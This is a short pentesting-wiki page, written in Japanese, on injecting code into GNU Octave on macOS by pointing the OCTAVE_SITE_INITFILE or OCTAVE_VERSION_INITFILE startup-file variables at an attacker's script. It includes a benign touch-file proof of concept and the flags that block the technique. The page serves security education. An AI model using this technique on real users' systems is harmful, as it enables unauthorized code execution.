# macOS GNU Octave Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave は、起動時に有効な Octave コマンドを含む複数のファイルを実行します。`OCTAVE_SITE_INITFILE` はサイト全体の startup file を上書きし、`OCTAVE_VERSION_INITFILE` はバージョン固有の startup file を上書きするため、いずれの変数でも自動実行先を攻撃者が読み取り可能なファイルへリダイレクトできます。<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` は `~/.octaverc` などのユーザーファイルのみをスキップし、上記の site-file の override は停止しません。site files には `--no-site-file` を使用するか、すべての startup files を無効にするには `--norc` / `-f` を使用してください。<sup>[[2]](#references)</sup>

## References

- [1] [GNU Octave Startup Files](https://docs.octave.org/latest/Startup-Files.html)
- [2] [GNU Octave Command Line Options](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
